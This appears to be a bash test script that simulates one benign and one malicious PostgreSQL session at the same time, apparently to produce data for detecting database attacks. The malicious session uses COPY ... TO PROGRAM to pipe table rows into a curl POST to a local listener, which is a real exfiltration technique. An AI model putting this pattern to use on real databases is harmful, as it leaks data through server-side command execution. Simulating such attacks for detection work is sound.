#!/bin/bash
echo "Simulating 1 Benign Session and 1 Malicious Session simultaneously..."

# The '&' pushes the command to the background, so both queries hit the database at the exact same moment.

# Benign heavily intensive DB read in Session A
psql -U postgres -d casce_tpcb -c "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;" > /dev/null 2>&1 &

# Malicious Exfiltration attack in Session B
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_tellers LIMIT 100) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';" > /dev/null 2>&1 &

# Wait for both specific sessions to terminate
wait
echo "Concurrent benign-vs-malicious sessions completed."
